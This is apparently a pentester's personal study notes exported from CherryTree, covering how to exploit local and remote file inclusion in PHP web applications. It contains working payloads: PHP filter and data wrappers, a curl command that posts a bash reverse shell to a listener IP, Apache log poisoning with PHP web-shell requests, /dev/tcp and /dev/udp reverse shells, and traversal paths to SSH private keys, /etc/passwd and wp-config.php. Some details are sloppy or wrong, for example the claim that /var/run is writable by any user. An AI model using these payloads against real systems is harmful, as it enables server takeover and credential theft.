<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>23- LFI</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>23- LFI</h1><br/><p></p><p><em><h2>php filters</h2></em></p><p><div class="codebox"><pre><span style="color:#0088ff;font-weight:400">### goal : read source cod</span><br /><br />php<span style="color:#ff9d00;font-weight:700">://filter/</span>convert.<span style="color:#00117f;font-weight:400">base64-encode</span><span style="color:#ff9d00;font-weight:700">/</span>resource<span style="color:#ff9d00;font-weight:700">=</span>index.php <br />data<span style="color:#ff9d00;font-weight:700">:</span>text<span style="color:#ff9d00;font-weight:700">/</span>plain,&lt;<span style="color:#ff9d00;font-weight:700">?</span>php <span style="color:#ff9d00;font-weight:700">echo</span> shell_exec(<span style="color:#3ad900;font-weight:400">&quot;dir&quot;</span>) <span style="color:#ff9d00;font-weight:700">?</span>&gt;<br /><span style="color:#0088ff;font-weight:400">### LFI only works when the developper doesn&#39;t set filetrs to the data supplied</span><br /><br /><span style="color:#0088ff;font-weight:400">## LFI 2 RCE</span><br />curl <span style="color:#ff9d00;font-weight:700">-</span>s <span style="color:#ff9d00;font-weight:700">--</span>data <span style="color:#3ad900;font-weight:400">&quot;&lt;?system(&#39;bash -i &gt;&amp; /dev/tcp/192.168.119.156/443 0&gt;&amp;1&#39;);?&gt;&quot;</span> <span style="color:#3ad900;font-weight:400">&quot;http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input&quot;</span><br />data<span style="color:#ff9d00;font-weight:700">://</span>text<span style="color:#ff9d00;font-weight:700">/</span>plain,&lt;<span style="color:#ff9d00;font-weight:700">?</span>php<span style="color:#ff9d00;font-weight:700">%</span>20echo<span style="color:#ff9d00;font-weight:700">%</span>20system(<span style="color:#333333;font-weight:400">&#39;ls&#39;</span>);<span style="color:#ff9d00;font-weight:700">?</span></pre></div></p><p><h3></h3></p><p><h3></h3></p><p><em><h2>LFI usage</h2></em><ol><li> idea: upload a malicious file and execute it using RF<ol><li>  enumerate runing processes (/proc/self)</li><li>https://github.com/payloadbox/rfi-lfi-payload-list<ol><li>get web techno configs </li></ol></li><li>packages installed </li></ol></li><li> SHELL :<ol><li>/proc/pid/cmdline</li><li>bruteforce pid </li><li>list processes for example port number </li></ol></li><li>if ssh present<ol><li>/etc/passwd =&gt; detect users</li></ol></li><li>/home/&lt;user&gt;/.ssh/id_rsa</li><li>LFI techniques<ol><li>double ....//....//....//....//....//....//etc/passwd</li><li>php filters to get code file of php</li></ol></li></ol></p><p></p><p><h2>LFI 2 RCE apache: poison log</h2><ul><li>/var/log/apache2/access.log =&gt; HTTP access log port 80</li><li>attack<ul><li>poison the log<ul><li>nc -nv $target 80</li><li>GET /&lt;?php echo &#39;&lt;pre&gt;&#39;.passthru($_GET[&#39;cmd1&#39;]). &#39;&lt;/pre&gt;&#39;;?&gt;</li><li>GET /&lt;?php echo &#39;&lt;pre&gt;&#39; . shell_exec($_GET[&#39;cmd&#39;]) . &#39;&lt;/pre&gt;&#39;;?&gt;</li></ul></li><li>exce command<ul><li>http://$target?file=../../../../../var/log/apache2/access.log &amp;cmd=id</li><li>shell<ul><li>bash -c &#39;bash -i &gt;&amp; /dev/tcp/192.168.119.135/4444 0&gt;&amp;1&#39;</li><li>to escape chars </li></ul></li></ul></li></ul></li></ul></p><p></p><p>GET /&lt;?php passthru(&#39;<strong><small>sh</small></strong> -i &gt;&amp; /dev/udp/<strong><small>192.168.119.135</small></strong>/<strong><small>443</small></strong> 0&gt;&amp;1&#39;)?&gt;</p><p></p><p></p><p></p><p></p><p></p><p></p><p><h2>LFI : interesting paths linux</h2></p><p></p><p><div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">/</span>etc<span style="color:#ff9d00;font-weight:700">/</span>passwd <span style="color:#0088ff;font-weight:400">## find users</span><br /><span style="color:#ff9d00;font-weight:700">/</span>proc<span style="color:#ff9d00;font-weight:700">/</span>self<span style="color:#ff9d00;font-weight:700">/</span>cmdline <span style="color:#0088ff;font-weight:400">## from where we are runing web server ## good to leak app source code </span><br /><span style="color:#ff9d00;font-weight:700">/</span>proc<span style="color:#ff9d00;font-weight:700">/</span><span style="color:#7f0044;font-weight:400">$pid</span><span style="color:#ff9d00;font-weight:700">/</span>cmdline <span style="color:#0088ff;font-weight:400">## process runing </span><br /><span style="color:#ff9d00;font-weight:700">for</span> <span style="color:#7f0044;font-weight:400">i</span> <span style="color:#ff9d00;font-weight:700">in</span> <span style="color:#333333;font-weight:400">$(seq 0 1000)</span><span style="color:#ff9d00;font-weight:700">;</span> <span style="color:#ff9d00;font-weight:700">do</span> <span style="color:#ff9d00;font-weight:700">echo</span> -n <span style="color:#3ad900;font-weight:400">&quot;$i:&quot;</span> <br /><span style="color:#ff9d00;font-weight:700">/</span>proc<span style="color:#ff9d00;font-weight:700">/</span>self<span style="color:#ff9d00;font-weight:700">/</span>environ <span style="color:#0088ff;font-weight:400">## access environment variables </span><br /><span style="color:#ff9d00;font-weight:700">/</span>home<span style="color:#ff9d00;font-weight:700">/</span><span style="color:#7f0044;font-weight:400">$user</span><span style="color:#ff9d00;font-weight:700">/</span>.ssh<span style="color:#ff9d00;font-weight:700">/</span>authorized_keys <span style="color:#0088ff;font-weight:400">## find algorithm used for openssh keys </span><br /><span style="color:#0088ff;font-weight:400"># ssh convention of naming id_{key_algorithm}(ie. id_rsa or id_dsa) for the private key and then the private key name</span><br /><span style="color:#0088ff;font-weight:400">## e.g ecdsa algorithm =&gt; id_ecdsa </span><br /><span style="color:#0088ff;font-weight:400">## linux apache </span><br /><span style="color:#ff9d00;font-weight:700">/</span>var<span style="color:#ff9d00;font-weight:700">/</span>www<span style="color:#ff9d00;font-weight:700">/</span><span style="color:#7f0044;font-weight:400">$vhost</span><span style="color:#ff9d00;font-weight:700">/</span>.htaccess <span style="color:#0088ff;font-weight:400"># config for evry apache directory</span><br /><span style="color:#ff9d00;font-weight:700">/</span>var<span style="color:#ff9d00;font-weight:700">/</span>www<span style="color:#ff9d00;font-weight:700">/</span><span style="color:#7f0044;font-weight:400">$vhost</span><span style="color:#ff9d00;font-weight:700">/</span>.htpasswd <span style="color:#0088ff;font-weight:400"># used to store usernames and their associated password hashes </span></pre></div></p><p></p><p><h2>LFI windows</h2><ul><li><h3> \WINDOWS\System32\drivers\etc\hosts.</h3></li><li><h3>  \windows\win.ini</h3></li><li><h3>https://gist.github.com/korrosivesec/a339e376bae22fcfb7f858426094661e</h3></li><li><h3>directory traversal</h3><ul><li><h3>c:\</h3></li></ul></li><li><h3>if we have viewer </h3><ul><li><h3>\Users\$user\.ssh\id_rsa</h3></li></ul></li></ul></p><p></p><p></p><p><h2>RFI overview</h2><h3></h3></p><p><h3>◇the attacker puts the malicious stuff in his local server</h3><h3></h3></p><p><h3> - web browser : ?lang=&quot;https://&lt;attacker-server/malicious.php&quot;</h3><h3></h3></p><p><h3> - → ?lang=////10.10.14.11//share/test.php</h3><h3></h3></p><p><h3> → ⇒ // also try \</h3><h3></h3></p><p><h3> </h3><h3></h3></p><p><h3> </h3><h3></h3></p><p><h3> </h3><h3></h3></p><p><h3> </h3><h3></h3></p><p><h3> - bypass the trailing (what the developper adds to the parameter)</h3><h3></h3></p><p><h3> - method 1 : make our file have this trailing</h3><h3></h3></p><p><h3> - method 2 : we use null byte injection</h3><h3></h3></p><p><h3> </h3><h3></h3></p><p><h3> </h3><h3></h3></p><p><h3> ▪ how to make the code being executed on the server side (insted of the client side)</h3><h3></h3></p><p><h3> ▪ - So the idea to overcome the problem is, instead of writing the malicious PHP code as the executable, I write our exploit code in a string and &quot;echo” the string so the string that contains PHP code will be sent back to the target’s server and will be executed on the target’s server.</h3><h3></h3></p><p><h3> - get a file</h3><h3></h3></p><p><h3> - echo &#39;&lt;?php echo base64_encode(file_get_contents(&quot;index.php&quot;));&#39;</h3><h3></h3></p><p><h3> </h3><h3></h3></p><p><h3> </h3><h3></h3></p><p><h3></h3><h2>Exploiting LFI </h2><ol><li><h3> try to get RCE: by uploading a file for example </h3></li><li><h3> check wordpress config :</h3><ol><li><h3> ../../../wp-config.php  // to get some passwords </h3></li></ol></li><li><h3>if runing on apache : check apache config </h3></li><li><h3>fuzz files lfi: </h3><ol><li><em><h3>https://github.com/payloadbox/rfi-lfi-payload-list</h3></em></li></ol></li></ol><h3></h3></p><p><h3> </h3><h3></h3></p><p><h3></h3></p><p><h2>Linux word writables files</h2></p><p><div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">/</span>tmp: This directory is used for temporary files that can be written to by any user on the system.<br /><br /><span style="color:#ff9d00;font-weight:700">/</span>var<span style="color:#ff9d00;font-weight:700">/</span>tmp: This directory is similar to /tmp, but it is typically used for temporary files that need to persist between reboots.<br /><br /><span style="color:#ff9d00;font-weight:700">/</span>var<span style="color:#ff9d00;font-weight:700">/</span>run: This directory contains system information files that are updated during runtime and can be modified by any user on the system.<br /><br /><span style="color:#ff9d00;font-weight:700">/</span>var<span style="color:#ff9d00;font-weight:700">/</span>lock: This directory is used to store lock files for various system resources, such as device files and network sockets. It is typically writable by all users on the system.</pre></div></p></div>
</body>
</html>
